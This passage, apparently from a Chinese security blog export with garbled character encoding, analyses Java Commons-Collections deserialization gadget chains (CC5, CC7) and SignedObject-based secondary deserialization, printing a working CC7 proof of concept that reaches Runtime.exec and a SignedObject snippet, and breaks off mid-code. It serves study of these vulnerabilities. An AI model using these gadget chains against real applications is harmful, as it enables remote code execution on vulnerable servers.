src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743599823-bddea8e9-0437-4c54-af01-80ba9066a9eb.png"></p><p>æˆ‘ä»¬æ‰¾åˆ°äº†TiedMapEntryç±»é‡Œé¢çš„toStringæ–¹æ³•ä¸­è°ƒç”¨äº† getValueæ–¹æ³•ã€‚è¿™ä¸ªæœ‰ç‚¹ç†Ÿæ‚‰åœ¨cc6ä¸­å‡ºç°è¿‡è·Ÿåˆ°getValueä¸­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743660503-cd5c9bc1-8c39-46cf-b740-28dbd39bbed1.png"></p><p>å‘ç°è°ƒç”¨äº† getæ–¹æ³•è€Œæˆ‘ä»¬åœ¨cc6ä¸­å·²å°†çŸ¥é“TiedMapEntryç±»çš„æ„é€ æ–¹æ³•æ˜¯å¯ä»¥ç›´æ¥å¯¹mapè¿™ä¸ªå±æ€§è¿›è¡Œèµ‹å€¼çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743712373-34322b83-7a98-4342-b42d-288737acc8f4.png"></p><p>æ‰€ä»¥è¿™é‡Œåªéœ€è¦æ‰¾åˆ°å¯ä»¥è§¦å‘è¯¥ç±»toStringçš„æ–¹æ³•å°±å¯ä»¥</p><p>ç»§ç»­è°ƒè¯•æˆ‘ä»¬å‘ç°äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743765500-03b8b2ed-d1f5-4333-a121-ea4abb10fa02.png">åœ¨BadAttributeValueExpExceptionè¿™ä¸ªç±»çš„readObjectä¸­å‘ç°äº†è°ƒç”¨äº†toStringæ–¹æ³•æ˜¯ç”±valObjè§¦å‘çš„è€ŒvalObjåˆ™æ˜¯è·å¾—valå±æ€§çš„å€¼ï¼Œç„¶åçœ‹çœ‹å…¶æ„é€ æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743831365-8c298754-31a8-4aa8-8fa4-cb28ef460830.png"></p><p>å‘ç°valæ˜¯å¯æ§çš„ï¼Œä½†æ˜¯å‘ç°åœ¨æ„é€ æ–¹æ³•é‡Œä¹Ÿè°ƒç”¨äº†toStringæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨æ„é€ çš„æ—¶å€™ä¸èƒ½ä¼ å…¥TiedMapEntryå¯¹è±¡ï¼Œå› ä¸ºè¿™å›å¯¼è‡´åœ¨åºåˆ—åŒ–å‰å°±ä¼šrceæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨å®ä¾‹åŒ–å®Œä¹‹ååå°„ä¿®æ”¹å…¶å±æ€§å€¼å°±å¯ä»¥äº†ã€‚</p><h3 id="cc5è°ƒç”¨é“¾"><a href="#cc5è°ƒç”¨é“¾" class="headerlink" title="cc5è°ƒç”¨é“¾"></a>cc5è°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714744407880-2899e688-e3e0-4ee2-bf22-275798698aa0.png"></p><h2 id="java-cc7é“¾"><a href="#java-cc7é“¾" class="headerlink" title="java  cc7é“¾"></a>java  cc7é“¾</h2><p>å…¶å®è¯¥æ¡åˆ©ç”¨é“¾å’Œcc5ä¹Ÿæ˜¯å¤§åŒå°å¼‚ï¼Œä¹Ÿæ˜¯åˆ©ç”¨LazyMapå»è§¦å‘çš„ï¼Œåªä¸è¿‡å…¥å£ç‚¹æ¢æˆäº†Hashtable</p><p>æˆ‘ä»¬å…ˆæ¥ç›´æ¥çœ‹çœ‹ç½‘ä¸Šçš„pocç„¶åè·Ÿç€åˆ†æåˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="é—®é¢˜1"><a href="#é—®é¢˜1" class="headerlink" title="é—®é¢˜1"></a>é—®é¢˜1</h4><p>ä»pocä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿›è¡Œäº†Hashtableä¸¤æ¬¡putè€Œä¸”éƒ½æ˜¯ç›¸åŒçš„keyï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼Ÿæˆ‘ä»¬ç›´æ¥çœ‹å…¶readObjectæ–¹æ³•å°±ä¸å€’ç€è°ƒè¯•äº†ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714747290107-e9dba1e1-7eb7-400b-9db5-a354fc864189.png"></p><p>lementsä»£è¡¨é”®å€¼å¯¹çš„ä¸ªæ•°ï¼Œæˆ‘ä»¬åˆ›å»ºHashtableæ—¶ä¼ å…¥äº†ä¸¤ä¸ªé”®å€¼å¯¹ï¼Œæ•…elements&#x3D;2</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714749474176-5dc0367a-abcf-4683-b2e0-05dc99129ba2.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨readObjectä¸­çš„forå¾ªç¯é‡Œè¯»å‡ºäº†åºåˆ—åŒ–å†™è¿›å»çš„key å’Œ valueå€¼ è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¬¡å¾ªç¯è·å–çš„æ˜¯ç¬¬ä¸€æ¬¡hashtable putçš„key å’Œ valueå€¼ç„¶åè·Ÿåˆ°reconstitutionPutæ–¹æ³•çœ‹çœ‹<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714749848646-ff4fe199-d812-4d22-a3e0-6bdd7b093fdd.png"></p><p>ä»è°ƒè¯•ä¿¡æ¯ä»¥åŠä»£ç å¯ä»¥çœ‹å‡ºç¬¬ä¸€æ¬¡forå¾ªç¯æ˜¯æ²¡æœ‰è¿›å»çš„ï¼Œæ˜¯å› ä¸ºè¿™é‡Œçš„tabæ˜¯ç©ºçš„æ‰€ä»¥æ²¡æ³•è¿›å…¥ï¼Œè€Œæˆ‘ä»¬å‘ç°ä»–åœ¨åé¢åˆç›´æ¥å°†æˆ‘ä»¬ä¼ å…¥è¿‡æ¥çš„keyï¼ˆç¬¬ä¸€ä¸ªä¼ å…¥çš„lazymapï¼‰ å’Œ value  ï¼ˆå€¼ä¸º1ï¼‰åˆç›´æ¥å®ä¾‹åŒ–åˆ°tabé‡Œé¢äº†ã€‚</p><p>æ‰€ä»¥ç»§ç»­è·Ÿè¿›ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750203246-2fbb6072-69fd-4cf7-8027-f769d544af3d.png"></p><p>ç­‰åˆ°ç¬¬äºŒæ¬¡ä¼ è¿›æ¥çš„å€¼çš„æ—¶å€™å°±å¯ä»¥è¿›å…¥forå¾ªç¯äº†ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ä¸¤æ¬¡ä¼ å…¥åŒæ ·çš„keyï¼Œè¿™æ—¶ä¼šåœ¨forå¾ªç¯é‡Œè°ƒç”¨e.keyä¹Ÿå°±ç­‰äºLazyMapå¯¹è±¡ï¼ˆç¬¬ä¸€æ¬¡ä¼ å…¥çš„ï¼‰çš„equalsæ–¹æ³•å¹¶ä¸”ä¼ å…¥çš„å‚æ•°keyä¹Ÿæ˜¯LazyMapå¯¹è±¡æ˜¯ç¬¬äºŒæ¬¡hashtable putè¿›æ¥çš„ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜æ˜¯æˆ‘ä»¬å»æŸ¥çœ‹LazyMapå¹¶æ²¡æœ‰å‘ç°equalsæ–¹æ³•ï¼Œäºæ˜¯æˆ‘ä»¬å»æ‰¾ä»–çš„çˆ¶ç±»å‘ç°åœ¨AbstractMapDecoratorè¿™ä¸ªæŠ½è±¡ç±»é‡Œå®ç°äº†equalsæ–¹æ³•æˆ‘ä»¬ç»§ç»­è·Ÿè¿›çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750240472-95a635f2-3388-484b-baae-be078165c16c.png"></p><p>è¿™é‡Œæˆ‘ä»¬çŸ¥é“LazyMapä¹Ÿæ˜¯putä¸¤ä¸ªä¸€æ ·çš„keyæ˜¯hashmapå¯¹è±¡æ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨hashmapçš„equalsæ–¹æ³•</p><p>ä½†æ˜¯åŒæ ·ä»–ä¹Ÿæ²¡æœ‰equalsæ–¹æ³•æ‰€ä»¥ç›´æ¥åˆ°å®ƒçš„çˆ¶ç±»AbstractMapé‡Œçœ‹<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714750954087-89e308f6-13bd-4644-a736-49c0865a9e0b.png"></p><p>æ­¤æ—¶valueå¹¶ä¸ä¸ºç©ºæ‰€ä»¥è¿›å…¥åˆ°equalsæ–¹æ³•ä¸­ä¸”è°ƒç”¨äº†getæ–¹æ³•ï¼Œæ­¤æ—¶çš„må°±æ˜¯ç¬¬äºŒæ¬¡putè¿›æ¥çš„LazyMapå¯¹è±¡ï¼Œ</p><p>æ‰€ä»¥ä¹Ÿå°±è§¦å‘äº†rceï¼ˆåç»­ä¸€ç³»åˆ—çš„è¿‡ç¨‹è·Ÿå…¶å®ƒlazymapå¾ˆåƒï¼‰å°±ä¸å†ä¸€ä¸€è·Ÿäº†ã€‚</p><p>è¡¥å……è¯´æ˜ï¼šè¿™é‡Œåˆ†æçš„æœ‰ç‚¹é—®é¢˜ï¼Œè¿™é‡Œæ¶‰åŠåˆ°hashç¢°æ’çš„é—®é¢˜å»ºè®®å…ˆå‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/248169#h3-4">https://www.anquanke.com/post/id/248169#h3-4</a></p><p><a href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE#%E6%8E%A7%E5%88%B6%E5%93%88%E5%B8%8C%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89">http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE#%E6%8E%A7%E5%88%B6%E5%93%88%E5%B8%8C%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89</a></p><h4 id="é—®é¢˜2"><a href="#é—®é¢˜2" class="headerlink" title="é—®é¢˜2"></a>é—®é¢˜2</h4><p>ä¸ºä»€ä¹ˆè¦åå°„ä¿®æ”¹ChainedTransformerçš„å±æ€§å€¼</p><p>ç»è¿‡è°ƒè¯•æˆ‘ä»¬å‘ç°åœ¨hashtableå¯¹è±¡è¿›è¡Œputçš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨åˆ°equalsæ–¹æ³•å…·ä½“å‚ç…§é—®é¢˜1çš„åˆ†æ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714751842043-cbf6e4df-fb01-4188-ba28-8094371979c3.png"></p><p>æ‰€ä»¥åœ¨åºåˆ—åŒ–ä¹‹å‰æˆ‘ä»¬å…ˆä¼ ä¸€ä¸ªä¸èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤çš„invokertransformerå¯¹è±¡ã€‚</p><h4 id="é—®é¢˜3"><a href="#é—®é¢˜3" class="headerlink" title="é—®é¢˜3"></a>é—®é¢˜3</h4><p>ä¸ºä»€ä¹ˆè¦åˆ é™¤laymap2ä¸­çš„keyå€¼å‘¢ï¼Œå…¶å®è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‚è€ƒcc6é“¾ä¸­ä¸ºä»€ä¹ˆåœ¨åºåˆ—åŒ–ä¹‹å‰ç§»é™¤keyä¸€æ ·ï¼Œå› ä¸ºlazyMapæ‰§è¡Œgetæ–¹æ³•éœ€è¦ä¿è¯ä¸å­˜åœ¨è¿™ä¸ªå€¼<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714755545755-24aa5aa4-28c7-4d7a-9249-ed093b81390d.png"></p><p>è€Œæˆ‘ä»¬é€šè¿‡å‚è€ƒ<a href="https://www.anquanke.com/post/id/248169#h2-6">https://www.anquanke.com/post/id/248169#h2-6</a>æ–‡ç« å’Œè‡ªå·±è°ƒè¯•ä¹Ÿå‘ç°æˆ‘ä»¬åœ¨è¿›è¡Œputçš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨ä¸Šé¢æ‰€åˆ†æçš„ä¸€ç³»åˆ—æ–¹æ³•å¯¼è‡´æœ€åputæ—¶æœ€åè°ƒç”¨getçš„æ—¶å€™æˆ‘ä»¬ä¼šä¼ å…¥yyæ–¹æ³•æ­¤æ—¶å‘¢mapå¯¹è±¡æ˜¯lazymap2å…¶ä¸­æ˜¯æ²¡æœ‰yyçš„å€¼çš„ä½†æ˜¯</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714755927376-4f63cbbb-0a50-40fb-8e30-2de226e52b77.png"></p><p>æˆ‘ä»¬å‘ç°ä»–ä¼šputè¿›å»ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨åºåˆ—åŒ–ä¹‹å‰å°†å…¶å€¼åˆ é™¤æ‰ï¼Œè¿™æ ·åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æˆ‘ä»¬æ‰èƒ½è¿›å…¥åˆ¤æ–­æ¡ä»¶ä»è€Œè°ƒç”¨transformæ–¹æ³•ã€‚</p><p>cc7è°ƒç”¨é“¾</p><p>ç›´æ¥è´´åŸä½œçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure><h2 id="java-cc11é“¾"><a href="#java-cc11é“¾" class="headerlink" title="java cc11é“¾"></a>java cc11é“¾</h2><p>å‚è€ƒï¼š<a href="https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/#2-%E6%89%BE%E9%93%BE%E5%AD%90">https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/#2-%E6%89%BE%E9%93%BE%E5%AD%90</a></p><p><a href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p><h2 id="JRMPååºåˆ—åŒ–"><a href="#JRMPååºåˆ—åŒ–" class="headerlink" title="JRMPååºåˆ—åŒ–"></a>JRMPååºåˆ—åŒ–</h2><p>è¿™é‡Œæ¥èŠèŠjrmpååºåˆ—åŒ–èµ·å› æ˜¯ä»Šå¤©æ‰“æ³½é¹¿çš„ä¸€ä¸ªè½¦è”ç½‘çš„ä¸€é“é¢˜shiroååºåˆ—åŒ–ç»•è¿‡ç”¨åˆ°äº†è¿™ä¸ªjrmpï¼Œå½“æ—¶ç›´æ¥ç”¨å·¥å…·æ¢­çš„å¹¶ä¸çŸ¥é“å…¶åŸç†ï¼Œèµ›åæˆ‘ä»¬æ¥å­¦ä¹ ä¸€ä¸‹å½“ä½œè®°å½•ã€‚</p><p>è¿™é‡Œå¯ä»¥å‚è€ƒæˆ‘åœ¨rmiåŸç†ä¸­è®°å½•çš„æ–‡ç« å°±æ²¡æœ‰è‡ªå·±å†™ã€‚</p><p>ä¹Ÿå¯ä»¥å‚è€ƒè¿™ä¸ªæ–‡ç« ï¼š<a href="https://boogipop.com/2024/02/29/Ysoserial%20JRMPListener_Client%20Review/#Summary">https://boogipop.com/2024/02/29/Ysoserial%20JRMPListener_Client%20Review&#x2F;#Summary</a></p><p><a href="https://mp.weixin.qq.com/s/tlqNfOGUMdX0ionGBP2DeQ">https://mp.weixin.qq.com/s/tlqNfOGUMdX0ionGBP2DeQ</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14333695.html">https://www.cnblogs.com/nice0e3/p/14333695.html</a></p><p><a href="https://xz.aliyun.com/t/12780?time__1311=GqGxu7G=qCwxlrzG77DODciRF9lmioD">https://xz.aliyun.com/t/12780?time__1311&#x3D;GqGxu7G%3DqCwxlrzG77DODciRF9lmioD</a></p><p><a href="https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/#%E5%89%8D%E8%A8%80">https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/#%E5%89%8D%E8%A8%80</a></p><h2 id="æ·±å…¥javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#æ·±å…¥javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="æ·±å…¥javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>æ·±å…¥javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</h2><p><a href="https://blog.csdn.net/Leon_cx/article/details/81517603">https://blog.csdn.net/Leon_cx&#x2F;article&#x2F;details&#x2F;81517603</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒæ¬¡ååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>ä»–æ˜¯<code>java.security</code>ä¸‹ä¸€ä¸ªç”¨äºåˆ›å»ºçœŸå®è¿è¡Œæ—¶å¯¹è±¡çš„ç±»ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œ<code>SignedObject</code>åŒ…å«å¦ä¸€ä¸ª<code>Serializable</code>å¯¹è±¡ã€‚ä¸»è¦æ˜¯æ¥çœ‹ä»–çš„getObjectæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735218775514-955d3ece-aa81-4353-a226-4e506d7ec38c.png"></p><p>å¯ä»¥çœ‹åˆ°è¯¥æ–¹æ³•ä¸­å­˜åœ¨ä¸€ä¸ªreadObjectæ–¹æ³•å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¯ä»¥çœ‹åˆ°ä»–ååºåˆ—åŒ–çš„å†…å®¹æ¥è‡ªcontentè€Œè¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„çœ‹ä»–çš„æ„é€ æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735219090639-0c41c5db-990c-46be-ba40-874409d44e70.png"></p><p>å…¶æ„é€ æ–¹æ³•ä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°åºåˆ—åŒ–ï¼Œç„¶åèµ‹å€¼ç»™<code>content</code>å±æ€§ï¼Œ<code>SignedObject</code>çš„<code>getObject</code>æ–¹æ³•ä¼šå°†<code>content</code>å±æ€§ååºåˆ—åŒ–</p><p>åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼šå…ˆæ„é€ ä¸€ä¸ªæ¶æ„<code>SignedObject</code>ï¼Œç„¶åè°ƒç”¨å®ƒçš„<code>getObject()</code>æ–¹æ³•å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">kpg.initialize(<span class="number">1024</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(æ¶æ„å¯¹è±¡ ç”¨äºç¬¬äºŒæ¬¡ååºåˆ—åŒ–, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ€è·¯ï¼š</p><ul><li>è°çš„æ–¹æ³•è°ƒç”¨äº†<code>getObject</code>æ–¹æ³•ï¼Œç„¶åä¸€ç›´å¾€ä¸Šè·Ÿreadobjectæˆ–è€…getteræ–¹æ³•</li><li>è°çš„åå°„å¯æ§ï¼Œç›´æ¥è¿›è¡Œåå°„è°ƒç”¨</li></ul><p>é€šè¿‡å¯¹ç½‘ä¸Šå¸ˆå‚…çš„ä¸€äº›å­¦ä¹ å¯ä»¥çŸ¥é“ fastjson jackson cb Romeå¯ä»¥è§¦å‘getteræ–¹æ³•ï¼Œä¸‹é¢é€ä¸€æ¥çœ‹ä¸€ä¸‹</p><h2 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h2><p>å…·ä½“æ‰§è¡ŒåŸç†å‚è€ƒ<a href="https://www.yuque.com/zqiangweihuakai/ybltae/ifbslse58xxxv3ni">Romeååºåˆ—åŒ–</a>è®°å½•è¿˜ç®—å¯ä»¥ã€‚</p><h3 id="ToStringBeané“¾"><a href="#ToStringBeané“¾" class="headerlink" title="ToStringBeané“¾"></a>ToStringBeané“¾</h3><p>è¿™é‡Œä¸»è¦å…³æ³¨å…¶äºŒæ¬¡ååºåˆ—åŒ–çš„ç‚¹ï¼Œçœ‹ä¸€ä¸‹poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> 